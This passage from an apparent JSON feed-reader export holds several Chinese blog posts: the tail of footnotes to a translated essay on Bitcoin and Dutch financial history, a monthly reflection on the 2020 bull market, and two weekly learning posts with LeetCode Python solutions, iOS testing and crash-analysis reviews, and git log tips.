上的一个讨论，标题为’PSA: if you don’t own your private keys, you don’t own your bitcoin.’另一个可能出处是 Andreas Antonopoulos.: <em style=\"font-style: italic; color: black;\">注脚 20</em></p>\n<p>[21] 后来，AWB 违背自己的规章，私自放出无担保贷款给阿姆斯特丹市议会、荷兰政府、荷兰东印度公司。到 1669 年时 AWB 只保有 57% 的准备金水平。这些高风险的放贷行为最终造成了 AWB 的消亡。资料来源：“How Amsterdam got Fiat Money,” Quinn &amp; Roberds, 2010.注脚 21</p>\n<p>[22] 来源 <a href=\"https://www.beursgeschiedenis.nl/en/moment/the-bank-of-amsterdam/\" target=\"_blank\" rel=\"noopener\">https://www.beursgeschiedenis.nl/en/moment/the-bank-of-amsterdam/</a> 注脚 22</p>\n<p>[23] Bob McElrath, “On-Chain Defense in Depthm” 01/25/2019 于 Bitcoin Switzerland 的演讲。注脚 23</p>\n<p>[24] Bryan Bishop, “Bitcoin Vaults with anti-theft recovery/clawback mechanisms,” 08/07/2019 给比特币开发者的电邮。注脚 24</p>\n<p>[25] Wuille, “Miniscript,” 08/19/2019 给比特币开发者的电邮。注脚 25</p>\n<p>[26] h.info注脚 26</p>\n<p>[27] 来源 Kingston, “Governance and institutional change in marine insurance, 1350-1850,” 2014.注脚 27</p>\n<p>[28] 结果空前成功。1669 年时，VOC 有 50 条商船，40 条护航用的战船，并雇用 20,000 人。来源 “Introduction to Financial Technology,” Roy S. Freeman, 2006.注脚 28</p>\n<p>[29] 来源 “Completing a Financial Revolution: The Finance of the Dutch East India Trade and the Rise of the Amsterdam Capital Market, 1595-1612,” Gelderblom &amp; Jonker, 2004.注脚 29</p>\n<p>[30] 随着时间推移，阿姆斯特丹证交所开发出了一种握手协议来安全的执行交易。交易员 Joseph de la Vega 于 1688 年描述 “证交所的一个成员张开他的手，另一个成员将其手中股票取走，从而完成一个预定价格的股票交易，并由二次握手确认交易。一个新的握手示意一张新的卖单，然后买方出价。再一次次的握手中交易员手掌发红了起来。” 引述自 Roy S. Freeman 的 “Introduction to Financial Technology,” p.4. 注脚 30</p>\n<p>[31] 来源 “The world’s first stock exchange: how the Amsterdam market for Dutch East India Company shares became a modern securities market, 1602-1700,” L. O. Petram, 2011.注脚 31</p>\n<p>[32] 或许值得一提的是，前面提到 1607 年以 VOC 股票抵押贷款的贷款价值比 66% 与 Unchained Capital 比特币抵押贷款所采用的贷款价值比。<a href=\"https://www.unchained-capital.com/loans/\" target=\"_blank\" rel=\"noopener\">https://www.unchained-capital.com/loans/</a> 注脚 32</p>\n<p>[33] 参阅 “The Use of Perpetual Annuities in Rural Brabant in the Fifteenth and Sixteenth Centuries,” Limberger &amp; De Vijlder, 2018. 自 16 世纪以来，法律通常担保以现金价值赎回年金 - 让年金这样的产品类似于借贷。注脚 33</p>\n<p>[34] 参阅 genesiscap.co, “Digital Asset Lending Snapshot” 2019 Q3 Insights. 注脚 34</p>\n<p>[35] 参阅 Gertrude Chavez-Dreyfuss, “Initial Exchange Offerings Flourish in Crypto Market,” 6/20/2019. 注脚 35</p>\n<p>[36] 参阅 <a href=\"https://www.bitfinex.com/wp-2019-05.pdf\" target=\"_blank\" rel=\"noopener\">https://www.bitfinex.com/wp-2019-05.pdf</a> 和 <a href=\"https://leo.bitfinex.com/\" target=\"_blank\" rel=\"noopener\">https://leo.bitfinex.com/</a>. 注脚 36</p>\n<p>[37] 参阅 <a href=\"https://www.binance.com/resources/ico/Binance_WhitePaper_en.pdf\" target=\"_blank\" rel=\"noopener\">https://www.binance.com/resources/ico/Binance_WhitePaper_en.pdf</a>. 注脚 37</p>\n<p>[38] 参阅 <a href=\"https://twitter.com/EricRWeinstein\" target=\"_blank\" rel=\"noopener\">https://twitter.com/EricRWeinstein</a> 于 8/24/2019 的推文注脚 38</p>\n<p>[39] “1536 年时《愚人讼》已有 36 种不同的拉丁文版本,” 出自 Egbertus Van Gulik “Erasmus and His Books” (2018) p.118.注脚 39</p>\n<p>[40] “梵蒂冈文献指出 1512 年时，富裕的银行家族，例如德国的 Fuggers 家族，成为赎罪券收据和其他税务收据的收款者。随著中世纪时间推演，税的种类越多、对人民的负担越来越沉重。原本暂时性的税改为永久的税，并且针对了最富裕的教堂成员出现了许多新的税种。[…] 除了赎罪券的市场以外，也有大量证据显示同样的寻租行为存在于婚姻市场里。内婚制与婚姻法规被操纵、赎罪诺言被加诸于婚姻契约里，以便将租金最大化。” 出自 “An Economic Analysis of the Protestant Reformation,” Journal of Political Economy, 2022, p. 656.注脚 40</p>\n<p>[41] 来源 Inge De Moor, “De kracht van het protestantse woord: Het succes van de hagenpreken in Antwerpen en Gent,” 2010. 注脚 41</p>\n<p>[42] 来源 Amy Eberlin, “Flemish Relgious Emigration in the 16th/17th Centuries.” 注脚 42</p>\n<p>[43] “荷兰的反异教徒法规的压抑性冠绝全欧洲 - 1523 到 1566 年间至少 1300 人被处决、数千人被起诉、罚款或是放逐。” 出自 Judith Pollmann, “Countering the Reformation in France and the Netherlands,” 2006. 注脚 43</p>\n<p>[44] Plantjin 移居安特卫普的动机是 “就我想开始做的生意而言，世界上没有其他城市可以提供给我更多资源了。安特卫普很容易到达；各国都在这个市场进行贸易；做生意不可或缺的各种原物料都能在这里找到；各行各业的工匠都能在这里轻易的找到、指导。” 来源: “From Antwerp and Amsterdam to London: The Decline of Financial Centres in Europe,” Peter Spufford, De Economist 154, 2006, p.155. 注脚 44</p>\n<p>[45] 参阅 <a href=\"https://en.wikipedia.org/wiki/Compromise_of_Nobles\" target=\"_blank\" rel=\"noopener\">https://en.wikipedia.org/wiki/Compromise_of_Nobles</a>. 注脚 45</p>\n<p>[46] 这徵征著八十年战争 (荷兰独立战争) 的开始。在接下来的五十年里，西班牙将陆续派遣 140,000 名士兵到荷兰作战。1574 年尖峰时西班牙的法兰德斯军团一共有 86,235 名士兵。来源: Geoffrey Parker, “The Army of Flanders and the Spanish Road, 1567-1659,” 2004. 注脚 46</p>\n<p>[47] 参阅 “The Spanish Road to the Netherlands,” Geoffrey Parker, 2012. 注脚 47</p>\n<p>[48] Source “Cities at War in Early Modern Europe,” Martha Pollak, 2010, p.14. 注脚 48</p>\n<p>[49] 谣言指出一艘载有西班牙士兵薪资的黄金舰队被名为海上乞丐的荷兰私掠舰拦截，给安特卫普失陷提供了一个理由。参阅 “From Criminal to Courtier: The Soldier in Netherlandish Art 1550-1672,” David Kunzle, p. 145. 注脚 49</p>\n<p>[50] 来源 “Antwerpen in de tijd van de Reformatie,” Guido Marnef, 1996, p.25: <a href=\"https://www.dbnl.org/tekst/marn002antw01_01/\" target=\"_blank\" rel=\"noopener\">https://www.dbnl.org/tekst/marn002antw01_01/</a> 注脚 50</p>\n<p>[51] 参阅 “Prices and wages as development variables: A comparison between England and the Southern Netherlands, 1400–1700,” 1978, p. 93. 部分原因是荷兰共和国 (1587-1863) 针对任何抵达安特卫普货品实施进口通行费，导致安特卫普的总体经济水平直到 1850 年代才重新回到其 16 世纪达到的顶峰状态。参阅 <a href=\"https://en.wikipedia.org/wiki/Antwerp#Historical_population\" target=\"_blank\" rel=\"noopener\">https://en.wikipedia.org/wiki/Antwerp#Historical_population</a>. 注脚 51</p>\n<p>[52] 例子包括 Justus Lipsius (莱登大学第一任院长), Dirck van Os, Franciscus van den Enden (斯宾诺莎的老师), , Judocus Hondius (新世界的製图师)。另外，参阅 St. Andrews Institute 提供的数据，以及 Heinz Schilling 的 “Innovation through Migration: The Settlements of Calvinistic Netherlanders in Sixteenth- and Seventeenth-Century Central and Western Europe,” 1983. 注脚 52</p>\n<p>[53] 参阅 “Complexity and diversity: domestic material culture and French immigrant identity in early modern London,” Greig Parker, 2013. 注脚 53</p>\n<p>[54] 参阅 “The Role of Inbreeding in the Extinction of a European Royal Dynasty,” 2009. 注脚 54</p>\n<p>[55] 来源 Collin Woodard, “American Nations,” 2011.注脚 55</p>\n<p>[56] 参阅 Paul Finkelman, “The Roots of Religious Freedom in Early America: Religious Toleration and Religious Diversity in New Netherland and Colonial New York,” 2012. 注脚 56</p>\n<p>[57] “公爵的殖民地 (今天的曼哈顿) 或许是新世界里最多种语言混合的地方了。除了荷兰归正会的多数人，若实施人口普查我们会发现有来自荷兰与瑞典的路德教派信徒、来自法国的加尔文主义信徒、长老会信徒、清教徒、分离主义者、浸信会信徒、重浸派信徒、贵格会信徒、以及来自不列颠群岛或其他地方的其他新教宗派信徒，还有一小群犹太教信徒以及天主教信徒。[…] 新荷兰 (今天的曼哈顿) 之所以能实现如此高度的宗教包容几乎没有特定的理论或哲学依据。这样的包容是从一种需求里诞生的 - 人们需要在一个刚刚开发的边境上生活，并且鼓励相互的贸易与商业活动。简单来说，荷兰西印度公司将世俗的成功至于神学统一之上。” Finkelman, 2012. 注脚 57</p>\n<p>[58] 参阅 Finkelman, 2012. 注脚 58</p>\n<p>[59] 参阅 Finkelman, 2012. 注脚 59</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2020/10/12/BitcoinReformationFinal/",
          "creator": "",
          "pubDate": "2020-10-17T02:34:51.000Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2020/10/12/BitcoinReformationFinal/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "6a6d7e62bdbdfc2c965f458e7a264caf",
          "highlights": []
        },
        {
          "title": "一月一清零 | 听说我们身处牛市",
          "description": "\n    \n      <p>种种原因延迟了 8 月份的总结，其实牛市这个话题在 8 月的时候就想写一写的，因为整个 7 月份资本市场基本都是在上涨状态，朋友圈、微博都有很多人在晒投资收益的。</p>\n<p>回想起今年的 3 月和 4 月份，那时候大家都还在新冠疫情的爆发以及股市暴跌的恐惧中，估计大部分\n    \n    ",
          "content": "<p>种种原因延迟了 8 月份的总结，其实牛市这个话题在 8 月的时候就想写一写的，因为整个 7 月份资本市场基本都是在上涨状态，朋友圈、微博都有很多人在晒投资收益的。</p>\n<p>回想起今年的 3 月和 4 月份，那时候大家都还在新冠疫情的爆发以及股市暴跌的恐惧中，估计大部分人都不会想到短短几个月之后，大家对现实生活来了一个 180 度的大转弯，然后一路喊着：牛市来了。</p>\n<p>经历过 7 月份的上涨，8 月初就开始了调整。虽然身处牛市，但是很多人还是出现了亏损，尤其是今年刚刚进入市场的新人，大家带着对牛市赚钱的憧憬进来，然后充值，被套，最后割肉离场。要不然也不会有那一句话：牛市，是普通投资者亏损的主要原因。</p>\n<p>通过我在支付宝的基金收益也能看出一二，7 月份上涨收益最多，8 月份虽有回调但是整体是盈利的，但盈利的前提是入场早，那些在 7 月份高点入场的朋友就没有那么幸运了。</p>\n<p><img src=\"/blogimg/20200901001.jpg\" alt=\"20200901001\"></p>\n<p align=\"center\">↑ 支付宝收益月图</p>\n\n<p>总结这次资本市场的上涨原因无非是全球央行大放水，疫情得到控制后生产生活开始恢复，大家的信心又回来了。</p>\n<p>从事后诸葛亮的角度来看这次疫情和资本市场的上涨，我们可以找得到无数多的原因，但是真的身在其中的时候，疫情期间能够保持乐观、3 月份资本市场大跌敢于抄底的人总是少数。</p>\n<h3 id=\"交易的反思\"><a href=\"#交易的反思\" class=\"headerlink\" title=\"交易的反思\"></a>交易的反思</h3><p>而对于 3 月份的大跌，我也只是进行了指数基金很少的买入，依旧还是按照之前的定投计划进行的定投，所以整体上没有吃到本次下跌抄底带来的利润。这也是我需要反思的地方，在市场极端行情出现的时候要勇敢的进行判断并把握机会，买入优质资产然后等待时间带来的红利。</p>\n<p>就像巴菲特说的那样：别人恐惧时贪婪，别人贪婪时恐惧。而在交易的过程中，这样的操作或者这样的想法完全是反人性的，而如何看待人性中的这些缺点，并且克服它，然后进行理性的抉择。我想这是非常困难的事情。</p>\n<p>纵观过去的 7、8 月，A 股、港股、美股、数字货币等交易市场都有着很好的机会，但是在交易过程中我还有很多的东西需要学习。</p>\n<h3 id=\"阅读\"><a href=\"#阅读\" class=\"headerlink\" title=\"阅读\"></a>阅读</h3><p><div id=\"35033233\"><div></div></div></p>\n<p>阅读的一本交易相关的书，作者人称 T 神，现任富达低价股基金掌舵人，被誉为彼得·林奇接班人。</p>\n<p>在书中作者讲投资心理，投资盲点等等。就像我们在人生的不同阶段，拿小钱可能更多的是参与赌，以小博大，而大钱则需要细思，要考虑分险、安全性、可操作性等等。这也是投资路上每个人需要学习的东西。</p>\n<h3 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h3><p>2020 年已经过了 2/3，接下来的 9 月，继续努力。</p>\n<script type=\"text/javascript\">\nsetBookInfo(7.8,8.0,'35033233','https://book.douban.com/subject/35033233/','https://wfqqreader-1252317822.image.myqcloud.com/cover/568/30842568/t6_30842568.jpg','大钱细思：优秀投资者如何思考和决断','[美]乔尔?蒂林哈斯特（Joel Tillinghast）','说起富达基金，人们首先就会想到超级明星彼得·林奇，在执掌富达麦哲伦基金的13年中，林奇将旗下资产规模从1800万美元奇迹般地发展为140亿美元。<br>不过现在，投资专家们更关注乔尔·蒂林哈斯特的一举一动。他不仅是林奇亲自选定的衣钵传人，更保持了惊人的近30年的成功选股纪录。1989年，蒂林哈斯特创建了富达低价股基金，从那时起到现在，该基金年平均回报率高达13.8%，规模成长到了400多亿美元。')\n</script>",
          "category": "",
          "link": "https://zhangdinghao.cn/2020/09/01/restart202008/",
          "creator": "",
          "pubDate": "2020-09-01T16:48:47.000Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2020/09/01/restart202008/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "dc435e696d3cec43dc619922e10161e1",
          "highlights": []
        },
        {
          "title": "ARTS 09 - MessageMock：优雅的模拟 Objective-C 方法",
          "description": "\n    \n      <h2 id=\"前言：什么是ARTS\"><a href=\"#前言：什么是ARTS\" class=\"headerlink\" title=\"前言：什么是ARTS?\"></a>前言：什么是ARTS?</h2><p>ARTS 源于耗子叔在极客时间的专栏<a href=\"https://t\n    \n    ",
          "content": "<h2 id=\"前言：什么是ARTS\"><a href=\"#前言：什么是ARTS\" class=\"headerlink\" title=\"前言：什么是ARTS?\"></a>前言：什么是ARTS?</h2><p>ARTS 源于耗子叔在极客时间的专栏<a href=\"https://time.geekbang.org/column/intro/48\" target=\"_blank\" rel=\"noopener\">《左耳听风》</a>打卡活动。</p>\n<p>Algorithm：每周至少做一个 Leetcode 的算法题。主要是为了编程训练和学习。</p>\n<p>Review：阅读并点评至少一篇英文技术文章。主要是为了学习英文，如果你的英文不行，你基本上无缘技术高手。</p>\n<p>Tip：学习至少一个技术技巧。主要是为了总结和归纳你在日常工作中所遇到的知识点。</p>\n<p>Share：分享一篇有观点和思考的技术文章。主要是为了建立你的影响力，能够输出价值观。</p>\n<h2 id=\"Algorithm\"><a href=\"#Algorithm\" class=\"headerlink\" title=\"Algorithm\"></a>Algorithm</h2><p><a href=\"https://leetcode-cn.com/problems/valid-parentheses/\" target=\"_blank\" rel=\"noopener\">20. 有效的括号</a></p>\n<p>给定一个只包括 <code>&#39;(&#39;</code>，<code>&#39;)&#39;</code>，<code>&#39;{&#39;</code>，<code>&#39;}&#39;</code>，<code>&#39;[&#39;</code>，<code>&#39;]&#39;</code> 的字符串，判断字符串是否有效。</p>\n<p>有效字符串需满足：</p>\n<ol>\n<li>左括号必须用相同类型的右括号闭合。</li>\n<li>左括号必须以正确的顺序闭合。</li>\n</ol>\n<p>注意空字符串可被认为是有效字符串。</p>\n<p>示例 1:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><div class=\"line\">输入: &quot;()&quot;</div><div class=\"line\">输出: true</div></pre></td></tr></table></figure></p>\n<p>示例 2:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><div class=\"line\">输入: &quot;()[]&#123;&#125;&quot;</div><div class=\"line\">输出: true</div></pre></td></tr></table></figure></p>\n<p>示例 3:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><div class=\"line\">输入: &quot;(]&quot;</div><div class=\"line\">输出: false</div></pre></td></tr></table></figure></p>\n<p>示例 4:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><div class=\"line\">输入: &quot;([)]&quot;</div><div class=\"line\">输出: false</div></pre></td></tr></table></figure></p>\n<p>示例 5:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><div class=\"line\">输入: &quot;&#123;[]&#125;&quot;</div><div class=\"line\">输出: true</div></pre></td></tr></table></figure></p>\n<p>Python 3 代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><div class=\"line\">class Solution:</div><div class=\"line\">    def isValid(self, s):</div><div class=\"line\">        while &apos;&#123;&#125;&apos; in s or &apos;()&apos; in s or &apos;[]&apos; in s:</div><div class=\"line\">            s = s.replace(&apos;&#123;&#125;&apos;, &apos;&apos;)</div><div class=\"line\">            s = s.replace(&apos;[]&apos;, &apos;&apos;)</div><div class=\"line\">            s = s.replace(&apos;()&apos;, &apos;&apos;)</div><div class=\"line\">        return s == &apos;&apos;</div></pre></td></tr></table></figure>\n<h2 id=\"Review\"><a href=\"#Review\" class=\"headerlink\" title=\"Review\"></a>Review</h2><p><a href=\"https://mp.weixin.qq.com/s/jm2QvYqnvFCPcRPocpj9ZQ\" target=\"_blank\" rel=\"noopener\">MessageMock : 优雅的模拟 Objective-C 方法</a></p>\n<p>开源地址：<a href=\"https://github.com/indulgeIn/MessageMock\" target=\"_blank\" rel=\"noopener\">MessageMock</a></p>\n<p>在代码测试中，对于一些不容易获取的对象，可以虚拟（mock）出一个对象来帮助完成测试。在 iOS 中，已经有 OCMock 这样比较有名的开源框架去解决这个问题。但是 OCMock 在使用上的问题是比较繁琐麻烦，测试一个小的功能可能在使用上也比较麻烦。本文为这种场景提供了一种新的思路，基于 <code>objc_msgSend</code> 来进行方法的“模拟”和“校验”。</p>\n<p><strong>MessageMock</strong> 通过任意<code>[target selector]</code>调用命中目标方法：</p>\n<ul>\n<li>修改目标方法返回值、参数</li>\n<li>验证目标方法返回值、参数</li>\n<li>跳过目标方法调用</li>\n<li>获取目标方法命中次数</li>\n</ul>\n<h2 id=\"Tip\"><a href=\"#Tip\" class=\"headerlink\" title=\"Tip\"></a>Tip</h2><p><a href=\"https://github.com/anuraghazra/github-readme-stats/blob/master/docs/readme_cn.md\" target=\"_blank\" rel=\"noopener\">GitHub Readme Stats</a></p>\n<p>一个可以自己部署的服务，生成个人 GitHub 账户的统计，可以插在自述文件里面。如图所示，你还可以自定义卡片样式和内容。</p>\n<p><img src=\"/blogimg/20200815001.png\" alt=\"20200815001\"><br><img src=\"/blogimg/20200815002.png\" alt=\"20200815002\"><br><img src=\"/blogimg/20200815003.png\" alt=\"20200815003\"></p>\n<h2 id=\"Share\"><a href=\"#Share\" class=\"headerlink\" title=\"Share\"></a>Share</h2><p><a href=\"https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/\" target=\"_blank\" rel=\"noopener\">SHA-256 的原理（英文）</a></p>\n<p>本文通过一个简单的例子，一步步演示 SHA-256 算法，如何将字符串变成一个256位的哈希值。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2020/08/15/arts09/",
          "creator": "",
          "pubDate": "2020-08-15T03:41:27.000Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2020/08/15/arts09/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "37377766d3a5ee694affa364dec47f30",
          "highlights": []
        },
        {
          "title": "ARTS 08 - iOS Crash 分析攻略",
          "description": "\n    \n      <h2 id=\"前言：什么是ARTS\"><a href=\"#前言：什么是ARTS\" class=\"headerlink\" title=\"前言：什么是ARTS?\"></a>前言：什么是ARTS?</h2><p>ARTS 源于耗子叔在极客时间的专栏<a href=\"https://t\n    \n    ",
          "content": "<h2 id=\"前言：什么是ARTS\"><a href=\"#前言：什么是ARTS\" class=\"headerlink\" title=\"前言：什么是ARTS?\"></a>前言：什么是ARTS?</h2><p>ARTS 源于耗子叔在极客时间的专栏<a href=\"https://time.geekbang.org/column/intro/48\" target=\"_blank\" rel=\"noopener\">《左耳听风》</a>打卡活动。</p>\n<p>Algorithm：每周至少做一个 Leetcode 的算法题。主要是为了编程训练和学习。</p>\n<p>Review：阅读并点评至少一篇英文技术文章。主要是为了学习英文，如果你的英文不行，你基本上无缘技术高手。</p>\n<p>Tip：学习至少一个技术技巧。主要是为了总结和归纳你在日常工作中所遇到的知识点。</p>\n<p>Share：分享一篇有观点和思考的技术文章。主要是为了建立你的影响力，能够输出价值观。</p>\n<h2 id=\"Algorithm\"><a href=\"#Algorithm\" class=\"headerlink\" title=\"Algorithm\"></a>Algorithm</h2><p><a href=\"https://leetcode-cn.com/problems/add-two-numbers/\" target=\"_blank\" rel=\"noopener\">两数相加</a></p>\n<p>给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。</p>\n<p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p>\n<p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>\n<p>示例：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</div><div class=\"line\">输出：7 -&gt; 0 -&gt; 8</div><div class=\"line\">原因：342 + 465 = 807</div></pre></td></tr></table></figure>\n<p>Python3 代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><div class=\"line\">class Solution:</div><div class=\"line\">    def addTwoNumbers(self, l1: ListNode, l2: ListNode) -&gt; ListNode:</div><div class=\"line\">        a = ListNode() # 保留完整的链表</div><div class=\"line\">        l3 = a  # 保留完整的链表</div><div class=\"line\">        c = 0  # 进位</div><div class=\"line\">        while l1 or l2:</div><div class=\"line\">            x=l1.val if l1 else 0  # 没有下一节点时取0</div><div class=\"line\">            y=l2.val if l2 else 0</div><div class=\"line\">            tmp = x+y</div><div class=\"line\">            if tmp+c &lt;10:</div><div class=\"line\">                l3.next = ListNode(tmp+c)</div><div class=\"line\">                c=0  # 不进位，清零</div><div class=\"line\">            else:</div><div class=\"line\">                l3.next = ListNode(tmp+c-10)</div><div class=\"line\">                c=1  # 进位，进1</div><div class=\"line\">            # print(tmp)</div><div class=\"line\">            # print(l1)</div><div class=\"line\">            # print(l2)</div><div class=\"line\">            if l1:</div><div class=\"line\">                l1 = l1.next  # 进入链表的下一节点</div><div class=\"line\">            if l2:</div><div class=\"line\">                l2 = l2.next  # 进入链表的下一节点</div><div class=\"line\">            l3 = l3.next</div><div class=\"line\">        if c==1:</div><div class=\"line\">            l3.next = ListNode(1)  # 最后一个进位增加一个末尾节点，元素为1</div><div class=\"line\">        return a.next  # a的第一个是0，因此去头节点</div></pre></td></tr></table></figure>\n<h2 id=\"Review\"><a href=\"#Review\" class=\"headerlink\" title=\"Review\"></a>Review</h2><p><a href=\"https://mp.weixin.qq.com/s/hVj-j61Br3dox37SN79fDQ\" target=\"_blank\" rel=\"noopener\">iOS Crash 分析攻略</a></p>\n<p>本文主要从 Crash 日志渠道、Crash 捕获的原理、看懂 Crash 日志、Crash分析方法 等角度向大家普及下 Crash 原理及分析的思路。</p>\n<p>其中讲到的知识点有：Mach异常、UNIX信号、常见 Crash 错误码、Mach-O、汇编等。</p>\n<p>Crash 定位的过程是不断追溯 Crash 现场发生了什么的过程，通过对 Crash 日志的原理和内容的深入了解，可以帮助我们更快更好的定位应用崩溃问题。</p>\n<p>然而现实中可能还是会有些疑难的 Crash 不易定位，是因为 Crash 日志其实也并未保存了 Crash 现场最全的信息，更进一步的优化就是丰富 Crash 日志的信息，让我们获取更多的 Crash 现场信息， 比如 KSCrash 这个框架在这块做了一些努力。这些开源项目的代码是值得学习的。</p>\n<h3 id=\"参考-amp-引用-amp-拓展阅读\"><a href=\"#参考-amp-引用-amp-拓展阅读\" class=\"headerlink\" title=\"参考&amp;引用&amp;拓展阅读\"></a>参考&amp;引用&amp;拓展阅读</h3><p>总线错误: <a href=\"https://zh.wikipedia.org/wiki/%E6%80%BB%E7%BA%BF%E9%94%99%E8%AF%AF\" target=\"_blank\" rel=\"noopener\">https://zh.wikipedia.org/wiki/%E6%80%BB%E7%BA%BF%E9%94%99%E8%AF%AF</a></p>\n<p>书籍:《深入解析 Mach OS X &amp; iOS 操作系统》</p>\n<p>崩溃捕获系统的原理: <a href=\"https://junyixie.github.io/2019/09/28/CrashMonitorSystem/\" target=\"_blank\" rel=\"noopener\">https://junyixie.github.io/2019/09/28/CrashMonitorSystem/</a></p>\n<p>分析iOS Crash文件: <a href=\"https://developer.aliyun.com/article/8854\" target=\"_blank\" rel=\"noopener\">https://developer.aliyun.com/article/8854</a></p>\n<p>iOS开发同学的arm64入门: <a href=\"https://blog.cnbluebox.com/blog/2017/07/24/arm64-start/\" target=\"_blank\" rel=\"noopener\">https://blog.cnbluebox.com/blog/2017/07/24/arm64-start/</a></p>\n<p>SIGSEGV 和 SIGBUS: <a href=\"https://www.cnblogs.com/charlesblc/p/6262783.html?spm=ata.13261165.0.0.26cd7529Cecpmj\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/charlesblc/p/6262783.html?spm=ata.13261165.0.0.26cd7529Cecpmj</a></p>\n<p>iOS 调试进阶：<a href=\"https://zhuanlan.zhihu.com/c_142064221\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/c_142064221</a></p>\n<p>KSCrash：<a href=\"https://github.com/kstenerud/KSCrash\" target=\"_blank\" rel=\"noopener\">https://github.com/kstenerud/KSCrash</a></p>\n<p>PLCrashReporter: <a href=\"https://github.com/microsoft/plcrashreporter\" target=\"_blank\" rel=\"noopener\">https://github.com/microsoft/plcrashreporter</a></p>\n<h2 id=\"Tip\"><a href=\"#Tip\" class=\"headerlink\" title=\"Tip\"></a>Tip</h2><p><a href=\"https://hackernoon.com/ten-useful-git-log-tricks-7nt3yxy\" target=\"_blank\" rel=\"noopener\">Ten Useful Git Log Tricks</a></p>\n<h3 id=\"简洁的方式查看\"><a href=\"#简洁的方式查看\" class=\"headerlink\" title=\"简洁的方式查看\"></a>简洁的方式查看</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">git log --oneline</div></pre></td></tr></table></figure>\n<p>此命令可帮助您以更简洁的方式查看提交。它会将每次提交压缩到一行，并且只有很少的信息，例如较短的提交哈希，提交消息。</p>\n<h3 id=\"按日期查看\"><a href=\"#按日期查看\" class=\"headerlink\" title=\"按日期查看\"></a>按日期查看</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">git log --after=\"2020-15-05\"</div><div class=\"line\"></div><div class=\"line\">git log --after=\"2020-15-05\" --before=\"2020-25-05\" // 仅显示5月15日至5月25日的提交</div><div class=\"line\">git log --after=\"yesterday\" // shows only commits from yeserday</div><div class=\"line\"></div><div class=\"line\">git log --after=\"today\" // shows only today commits</div><div class=\"line\"></div><div class=\"line\">git log --before=\"10 day ago\" // omits last 10 days commits</div><div class=\"line\"></div><div class=\"line\">git log --after=\"1 week ago\" //show only commits from last week</div><div class=\"line\"></div><div class=\"line\">git log --after=\"2 week ago\"</div><div class=\"line\"></div><div class=\"line\">git log --after=\"2 month ago\" // shows only last 2 months commits</div></pre></td></tr></table></figure>\n<p>这些命令将按给定的时间间隔过滤提交。例如，– after将仅在给定时间段之后进行提交，而– before将仅在给定时间段之前进行提交。</p>\n<h3 id=\"git日志与差异更改\"><a href=\"#git日志与差异更改\" class=\"headerlink\" title=\"git日志与差异更改\"></a>git日志与差异更改</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">git log -p</div></pre></td></tr></table></figure>\n<p>此命令将显示具有差异更改的日志。这样您就可以知道每次提交中所做的更改。</p>\n<h3 id=\"按作者过滤提交\"><a href=\"#按作者过滤提交\" class=\"headerlink\" title=\"按作者过滤提交\"></a>按作者过滤提交</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">git log --author=\"Srebalaji\"</div></pre></td></tr></table></figure>\n<p>上面的命令将过滤出特定作者所做的提交。请注意，Git按正则表达式模式过滤掉。因此，不必担心确切的名称匹配或区分大小写。</p>\n<p>Git日志可以采用多个选项，因此你可以根据需要组合选项。例如，</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">git log --after=\"1 week ago\" --author=\"srebalji\" -p</div></pre></td></tr></table></figure>\n<h3 id=\"通过日志消息过滤提交\"><a href=\"#通过日志消息过滤提交\" class=\"headerlink\" title=\"通过日志消息过滤提交\"></a>通过日志消息过滤提交</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">git log --grep=\"ISSUE-43560\"</div></pre></td></tr></table></figure>\n<p>上面的命令将按各自的模式过滤提交。并且请记住，默认情况下它区分大小写。要使搜索不区分大小写，可以传递-i参数</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">git log -i --grep=\"issue-43560\"</div></pre></td></tr></table></figure>\n<p>下面的命令正在使用正则表达式模式搜索，并将搜索两个问题ID。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">git log -i --grep=\"issue-43560\\|issue-89786\"</div></pre></td></tr></table></figure>\n<h2 id=\"Share\"><a href=\"#Share\" class=\"headerlink\" title=\"Share\"></a>Share</h2><p><a href=\"https://justjavascript.com/\" target=\"_blank\" rel=\"noopener\">Just JavaScript 